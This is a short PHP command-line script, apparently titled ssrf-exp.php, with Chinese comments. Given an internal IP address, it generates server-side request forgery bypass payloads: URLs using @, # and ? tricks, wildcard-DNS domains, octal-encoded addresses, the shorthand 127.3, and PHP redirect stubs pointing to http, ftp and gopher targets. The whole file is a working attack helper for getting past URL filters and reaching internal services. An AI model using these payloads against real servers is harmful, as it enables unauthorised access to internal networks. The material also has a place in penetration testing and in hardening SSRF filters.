<?php
//需要访问的内网地址
if(empty(@$argv[1])) die('Usage: php ssrf-exp.php ip');
$site = @$argv[1];
$ipArr = explode('.', $site);
echo "@重定向：http://www.baidu.com@{$site}\n\r";
echo "#：http://{$site}#www.baidu.com\n\r";
echo "?：http://{$site}?www.baidu.com\n\r";
echo "加上端口：http://{$site}:80\n\r";
echo "任意域名：http://www.${site}.xip.io\n\r";
echo "http协议后无//：http:{$site}\n\r";
$hexip = "";
foreach ($ipArr as $value) {
	$hexip .= base_convert($value, 10, 16);
}
echo "八进制1：http://0" . base_convert($hexip, 16, 8) . "\n\r";
echo "八进制2：http://00" . base_convert($hexip, 16, 8) . "\n\r";
echo "八进制3：http://000" . base_convert($hexip, 16, 8) . "\n\r";
if ($ipArr[1] == 0 && $ipArr[2] == 0) {
	echo "ip缩写：{$ipArr[0]}.{$ipArr[3]}\n\r";
}
echo "本机地址：127.3\n\r";
echo "<?php header(\"Location: http://${site}\");?>\n\r";
echo "<?php header(\"Location: ftp://${site}\");?>\n\r";
echo "<?php header(\"Location: gopher://${site}/test_\");?>\n\r";
